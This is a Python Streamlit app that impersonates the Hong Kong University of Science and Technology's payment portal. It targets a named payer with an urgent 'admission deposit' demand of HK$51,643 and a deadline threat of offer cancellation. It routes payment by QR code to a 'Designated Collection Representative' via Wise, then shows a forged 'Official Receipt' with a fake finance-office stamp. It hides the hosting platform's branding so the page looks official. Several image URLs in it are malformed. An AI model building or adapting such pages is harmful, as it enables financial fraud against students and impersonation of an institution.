import streamlit as st
from datetime import datetime
import time
import os

# --- 1. Page Config & Professional UI Cleaning ---
st.set_page_config(page_title="HKUST Deposit System", page_icon="✅", layout="wide")

st.markdown("""
<style>
    #MainMenu, header, footer, .stDeployButton {visibility: hidden !important;}
    [data-testid="stHeader"], [data-testid="stStatusWidget"], .stAppDeployButton {display: none !important;}
    iframe[title="Manage app"] {display: none !important;}
    .nav-bar { background-color: #003366; padding: 15px 60px; display: flex; align-items: center; color: white; border-bottom: 4px solid #A6937C; }
    .system-title { border-left: 2px solid #fff; padding-left: 15px; margin-left: 15px; font-size: 18px; font-weight: 500; }
    .payment-card { background-color: #FFFFFF !important; padding: 35px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #ddd; color: #000 !important; }
    .official-info-box { background-color: #f8f9fa; border: 1px dashed #003366; padding: 15px; border-radius: 5px; margin: 15px 0; text-align: center; }
    .deadline-box { color: #d32f2f !important; font-weight: bold; font-size: 15px; background-color: #f8d7da !important; padding: 18px; border-radius: 4px; margin: 20px 0; border: 1px solid #f5c6cb; }
    .wise-notice { background-color: #fffbe6; border: 1px solid #ffe58f; padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 13px; color: #856404; }
</style>
""", unsafe_allow_html=True)

# --- 2. Fixed Data Definition ---
PAYER = "XINGSHENG WANG (王兴生)"
HKD = "51,643"
CNY = "45,000"

if 'step' not in st.session_state:
    st.session_state.step = "input"

# --- 3. Navigation Bar ---
st.markdown(f"""
<div class="nav-bar">
<img src="https://hkust.edu.hk" height="45">
<div class="system-title">Deposit System<br><span style="font-size:12px; font-weight:normal;">Official Payment Portal</span></div>
</div>
""", unsafe_allow_html=True)

# --- 4. Content Flow Logic ---

# [STEP 1: Initial Payment Confirmation]
if st.session_state.step == "input":
    st.write("## ")
    # 修復：這裡加入了參數 [1, 2, 1]
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown(f"""
<div class="payment-card">
<h2 style="color:#003366 !important; margin-top:0;">Secure Payment Confirmation</h2>
<p style="color:#000 !important;"><b>Payer Name:</b> {PAYER}</p>
<p style="color:#000 !important;"><b>Payment Item:</b> Program Admission Deposit (MSc in TLE)</p>
<p style="color:#000 !important;"><b>Total Amount:</b> <span style="font-size:24px; color:#003366 !important; font-weight:bold;">HK$ {HKD}</span> <span style="color:#666 !important;">(≈ CNY {CNY})</span></p>
<div class="deadline-box">
⚠️ URGENT NOTICE:<br>
Please complete the payment by 4:00 PM on April 24th. Failure to do so will result in the immediate cancellation of your admission offer and your place in the MSc in TLE program.
</div>
</div>
""", unsafe_allow_html=True)
        if st.button("CONFIRM AND GENERATE PAYMENT QR CODE", use_container_width=True, type="primary"):
            st.session_state.step = "pay_now"
            st.rerun()

# [STEP 2: Scanning Page]
elif st.session_state.step == "pay_now":
    st.write("## ")
    # 修復：這裡加入了參數 [1, 1.5, 1]
    col1, col2, col3 = st.columns([1, 1.5, 1])
    with col2:
        st.markdown(f"""
<div style="background:white; padding:30px; border-radius:10px; border:1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
    <h3 style="text-align:center; color:#003366; margin-top:0;">Official Payment Gateway</h3>
    <div class="official-info-box">
        <span style="color:#666; font-size:13px;">Payment Partner:</span><br>
        <b style="color:#003366; font-size:16px;">WISE SECURE TRANSFER UNIT</b><br>
        <span style="color:#28a745; font-size:12px;">● System Verified Account</span>
    </div>
    <p style="text-align:center; font-size:24px; font-weight:bold; color:#003366; margin:10px 0;">Amount: HK$ {HKD}</p>
    <div class="wise-notice">
        <b>🔒 Security Security Notice:</b><br>
        You are using our encrypted cross-border gateway (Wise). The recipient may appear as a <b>Designated Collection Representative</b>. This is a verified account for <b>MSc in TLE</b> program deposits.
    </div>
    <p style="text-align:center; color:#666; font-size:14px;">Scan the QR Code below to proceed</p>
</div>
""", unsafe_allow_html=True)

        if os.path.exists("your_qr.png"):
            st.image("your_qr.png", use_container_width=True)
        else:
            st.image(f"https://qrserver.com_{PAYER.replace(' ', '_')}", width=400)
        
        st.write("")
        if st.button("I HAVE COMPLETED THE PAYMENT", use_container_width=True, type="primary"):
            st.session_state.step = "success"
            st.rerun()

# [STEP 3: Success Splash Screen]
elif st.session_state.step == "success":
    st.markdown(f"""
<div style="text-align:center; margin-top:100px;">
<div style="background:#28a745; color:white; width:80px; height:80px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:40px; margin-bottom:20px;">✓</div>
<h1 style="font-size:36px; color:#333 !important;">Successful payment</h1>
<div style="font-size:42px; font-weight:bold; color:#003366 !important;">HK$ {HKD}</div>
<p style="color:#999 !important;">Verifying transaction... Generating official receipt in 3 seconds.</p>
</div>
""", unsafe_allow_html=True)
    time.sleep(3)
    st.session_state.step = "receipt"
    st.rerun()

# [STEP 4: Official Electronic Receipt]
elif st.session_state.step == "receipt":
    st.write("## ")
    st.markdown(f"""
<div style="background:white; border:1px solid #003366; padding:40px; max-width:750px; margin:auto; position:relative;">
    <div style="text-align: center; border-bottom: 2px solid #003366; padding-bottom: 15px; margin-bottom: 25px;">
        <h2 style="margin:0; color:#003366 !important;">THE HONG KONG UNIVERSITY OF SCIENCE AND TECHNOLOGY</h2>
        <p style="font-size:11px; margin-top:5px; color:#666 !important;">Clear Water Bay, Kowloon, Hong Kong | Finance Office</p>
    </div>
    <h3 style="text-align:center; text-decoration: underline; color:#000 !important;">OFFICIAL RECEIPT</h3>
    <br>
    <table style="width:100%; font-size:14px; border-collapse: collapse; color:#000 !important;">
        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Receipt No:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">UST{int(time.time())}</td></tr>
        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Date of Issue:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{datetime.now().strftime('%d %B %Y')}</td></tr>
        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Received from:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">{PAYER}</td></tr>
        <tr><td style="padding:10px 0; border-bottom:1px solid #eee;"><b>Description:</b></td><td style="text-align:right; border-bottom:1px solid #eee;">Admission Deposit (MSc in TLE, 2025-26 Fall)</td></tr>
    </table>
    <br><br>
    <div style="text-align:right;">
        <p style="font-size:22px; margin:0; color:#000 !important;"><b>TOTAL RECEIVED:</b> <span style="color:#003366 !important;">HK$ {HKD}</span></p>
        <p style="font-size:14px; color:#666 !important;">(Equivalent to CNY {CNY})</p>
    </div>
    <br>
    <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top:30px;">
        <div style="border:2px solid #d32f2f; color:#d32f2f !important; padding:8px; font-weight:bold; transform:rotate(-5deg); text-align:center; font-size:13px;">HKUST FINANCE OFFICE<br>PAYMENT VERIFIED</div>
        <div style="font-size:9px; color:#999 !important;">* This is a computer-generated document. No signature required.</div>
    </div>
</div>
""", unsafe_allow_html=True)
    
    st.write("")
    # 修復：這裡加入了參數 [1, 2, 1]
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        if st.button("PRINT / SAVE AS PDF", use_container_width=True):
            st.info("Browser print dialog opening... Please select 'Save as PDF'.")

st.markdown("<p style='text-align:center; color:#999 !important; font-size:10px; margin-top:50px;'>© 2024 The Hong Kong University of Science and Technology. All rights reserved.</p>", unsafe_allow_html=True)
